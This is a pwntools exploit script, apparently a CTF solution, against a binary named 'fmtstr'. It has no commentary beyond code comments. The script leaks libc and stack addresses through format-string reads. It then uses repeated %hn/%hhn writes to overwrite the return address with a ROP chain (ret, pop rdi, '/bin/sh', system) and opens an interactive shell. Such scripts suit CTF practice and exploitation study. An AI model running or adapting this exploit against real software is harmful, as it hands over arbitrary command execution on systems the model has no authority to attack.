from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=remote("node3.anna.nssctf.cn",28950)
io=process("./fmtstr")
elf=ELF("./fmtstr")
libc=ELF("./libc.so.6")

io.sendlineafter(b"answer: \n",b"y")

#leak libc
io.sendlineafter(b"> \n",b"1")
io.recvuntil(b"> \n")
payload=b"%29$p"
io.send(payload)
leak_addr=int(io.recv(14),16)-128-libc.sym[b"__libc_start_main"]
print("leak_addr:",hex(leak_addr))

# ret=0x40101a
ret=leak_addr+0x29cd6
pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b"/bin/sh"))
sys_addr=leak_addr+libc.sym[b"system"]

gdb.attach(io)
pause()

#leak stack
io.sendlineafter(b"> \n",b"1")
io.recvuntil(b"> \n")
payload=b"%13$p"
io.send(payload)
stack_addr=int(io.recv(14),16)
print("stack_addr:",hex(stack_addr))
ret_addr=stack_addr-0x110
print("ret_addr:",hex(ret_addr))

def fmt_t(addr,ctt,off1,off2):
    io.sendlineafter(b"> \n",b"1")
    io.sendafter(b"> \n","%{}c%{}$hn".format(addr&0xffff,off1))
    io.sendlineafter(b"> \n",b"1")
    io.sendafter(b"> \n","%{}c%{}$hhn".format(ctt&0xff,off2))
    
    for i in range(5):
        io.sendlineafter(b"> \n",b"1")
        io.sendafter(b"> \n","%{}c%{}$hhn".format((addr+i+1)&0xff,off1))
        io.sendlineafter(b"> \n",b"1")
        io.sendafter(b"> \n","%{}c%{}$hhn".format((ctt>>((i+1)*8))&0xff,off2))

fmt_t(ret_addr,ret,13,43)
fmt_t(ret_addr+0x8,pop_rdi,13,43)
fmt_t(ret_addr+0x10,str_sh,13,43)
fmt_t(ret_addr+0x18,sys_addr,13,43)


print("ret_addr:",hex(ret_addr))
print("ret:",hex(ret))
print("pop_rdi:",hex(pop_rdi))
print("str_sh:",hex(str_sh))
print("sys_addr:",hex(sys_addr))

io.sendlineafter(b"> \n",b"2")


io.interactive()